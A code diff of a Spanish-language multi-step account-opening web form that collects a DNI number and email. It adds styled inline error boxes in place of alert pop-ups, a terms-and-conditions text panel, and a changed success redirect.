@@ -14,6 +14,26 @@
         button { width: 100%; background-color: #1a73e8; color: white; border: none; padding: 12px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
         button:hover { background-color: #1557b0; }
         .error-msg { color: red; font-size: 14px; display: none; margin-bottom: 10px; }
+        .error-box{
+            background:#fdecea;
+            color:#b71c1c;
+            border:1px solid #f5c6cb;
+            padding:10px;
+            border-radius:6px;
+            font-size:14px;
+            margin-bottom:12px;
+            display:none;
+        }
+
+        .success-box{
+            background:#e8f5e9;
+            color:#1b5e20;
+            border:1px solid #c8e6c9;
+            padding:10px;
+            border-radius:6px;
+            font-size:14px;
+            margin-bottom:12px;
+        }
     </style>
 </head>
 <body>
@@ -22,6 +42,7 @@
    <div id="etapa_dni" class="step active">
         <h2>Paso 1: Verificación de Datos</h2>
         <p>Confirma tus datos para continuar con la validación de seguridad:</p>
+        <div id="error_datos" class="error-box"></div>
         
         <label>Número de DNI</label>
         <input type="text" id="input_dni" placeholder="DNI de 8 dígitos" maxlength="8">
@@ -45,6 +66,44 @@
     <div id="etapa_terminos" class="step">
         <h2>Paso 3: Términos</h2>
         <p>Acepta las condiciones para finalizar:</p>
+        <div id="error_terminos" class="error-box"></div>
+        <div style="height:180px; overflow-y:auto; border:1px solid #ddd; padding:15px; border-radius:6px; background:#fafafa; font-size:14px; margin-bottom:20px; line-height:1.5;">
+
+        <strong>Términos y Condiciones de Apertura de Cuenta</strong><br><br>
+
+        Al continuar con el proceso de apertura de cuenta, el usuario declara haber leído y aceptado los siguientes términos y condiciones:
+
+        <br><br>
+
+        1. <strong>Identificación del usuario</strong><br>
+        El usuario declara que la información proporcionada durante el proceso de registro es verdadera, completa y actualizada.
+
+        <br><br>
+
+        2. <strong>Uso de la cuenta</strong><br>
+        La cuenta creada será de uso personal e intransferible. El usuario es responsable de mantener la confidencialidad de sus credenciales y del uso adecuado de los servicios asociados.
+
+        <br><br>
+
+        3. <strong>Validación de identidad</strong><br>
+        La entidad podrá realizar verificaciones de identidad y validaciones adicionales para garantizar la seguridad del proceso de apertura y del uso de la cuenta.
+
+        <br><br>
+
+        4. <strong>Protección de datos personales</strong><br>
+        Los datos proporcionados serán tratados conforme a la normativa vigente de protección de datos personales y utilizados exclusivamente para fines relacionados con la apertura, gestión y seguridad de la cuenta.
+
+        <br><br>
+
+        5. <strong>Comunicaciones</strong><br>
+        El usuario autoriza el envío de comunicaciones relacionadas con su cuenta, incluyendo información de seguridad, confirmaciones y asistencia en el proceso de activación.
+
+        <br><br>
+
+        6. <strong>Aceptación</strong><br>
+        Al marcar la casilla de aceptación, el usuario confirma que ha leído, comprendido y aceptado los presentes términos y condiciones.
+
+        </div>
         <label style="display: block; margin-bottom: 20px; cursor: pointer;">
             <input type="checkbox" id="check_terminos"> Acepto los términos y condiciones.
         </label>
@@ -107,11 +166,15 @@
 
     // Validación simple
     if (dni.length < 8 || isNaN(dni)) {
-        alert("Por favor, ingresa un DNI válido.");
+        const errorBox = document.getElementById('error_datos');
+        errorBox.innerText = "Ingresa un DNI válido de 8 dígitos.";
+        errorBox.style.display = "block";
         return;
     }
     if (!email.includes("@") || email.length < 5) {
-        alert("Por favor, ingresa un correo electrónico válido.");
+        const errorBox = document.getElementById('error_datos');
+        errorBox.innerText = "Ingresa un correo electrónico válido.";
+        errorBox.style.display = "block";
         return;
     }
 
@@ -121,6 +184,8 @@
         dni: dni, 
         email: email 
     });
+
+    document.getElementById('error_datos').style.display = "none";
 
     // Avance visual
     document.getElementById('etapa_dni').classList.remove('active');
@@ -150,9 +215,13 @@
     async function enviarTerminos() {
         const acepto = document.getElementById('check_terminos').checked;
         if (!acepto) {
-            alert("Debes aceptar los términos.");
+            const errorBox = document.getElementById('error_terminos');
+            errorBox.innerText = "Debes aceptar los términos y condiciones para continuar.";
+            errorBox.style.display = "block";
             return;
         }
+
+        document.getElementById('error_terminos').style.display = "none";
         await postData({ fase: "Términos y Condiciones", estado: "Aceptado" });
         
         document.getElementById('etapa_terminos').classList.remove('active');
@@ -175,19 +244,10 @@
         await postData(payload);
 
         // Redirigir al éxito
-        window.location.href = "success.html";
+        window.location.href = "success2.html";
     }
     
 </script>
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
